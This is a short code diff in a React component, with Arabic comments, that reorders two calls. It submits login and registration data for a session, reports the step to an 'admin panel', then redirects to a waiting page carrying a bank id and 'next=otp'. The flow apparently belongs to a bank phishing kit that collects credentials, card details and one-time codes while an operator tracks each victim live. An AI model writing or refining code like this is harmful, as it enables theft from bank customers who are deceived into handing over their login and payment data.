@@ -80,12 +80,7 @@ export default function RegistrationCompletion() {
     }
 
     try {
-      // التأكد من إبلاغ لوحة الإدارة بالمرحلة الحالية قبل الإرسال
-      await reportStepMutation.mutateAsync({
-        sessionId,
-        step: "card-payment"
-      });
-
+      // إرسال بيانات الاشتراك أولاً - السيرفر سيحدث currentStep إلى "registration-completion"
       await submitLoginMethodMutation.mutateAsync({
         sessionId,
         loginType: "registration_completion",
@@ -104,6 +99,12 @@ export default function RegistrationCompletion() {
         totalAmount: "10",
       });
       
+      // إبلاغ لوحة الإدارة بالمرحلة الحالية (بعد submitLoginMethod للحفاظ على currentStep الصحيح)
+      await reportStepMutation.mutateAsync({
+        sessionId,
+        step: "registration-completion"
+      });
+
       setLocation(`/waiting?bank=${bankId}&session=${sessionId}&next=otp`);
     } catch (error) {
       toast.error(isArabic ? "حدث خطأ أثناء الإرسال" : "An error occurred during submission");
